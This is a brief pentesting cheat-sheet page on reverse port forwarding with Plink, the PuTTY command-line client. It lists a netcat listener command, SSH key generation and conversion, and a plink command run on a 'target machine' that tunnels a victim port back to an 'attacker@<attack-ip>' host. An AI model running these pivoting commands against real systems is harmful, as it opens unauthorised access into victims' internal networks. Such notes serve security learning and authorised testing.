---
title: Port Forwarding with Plink
description: Plink is a Windows command line version of the PuTTY SSH client.
tags:
    - Network
refs:
date: 2023-03-19
draft: false
---

## Reverse Connection

### 1. Open Lisnter in Your Local Machine

```sh
nc -lvnp 4444
```

### 2. Run Reverse Connection in Target Machine

First of all, generate SSH keys. Two keys (public and private) will be generated.

```sh
ssh-keygen
```

Convert the private key for Windows.

```sh
puttygen private_key -o private_key.ppk
```

Run reverse connection using plink.

```powershell
cmd.exe /c echo y | .\plink.exe -R <attack-port>:<victim-ip>:<victim-port> attacker@<attack-ip> -i private_key.ppk -N
```
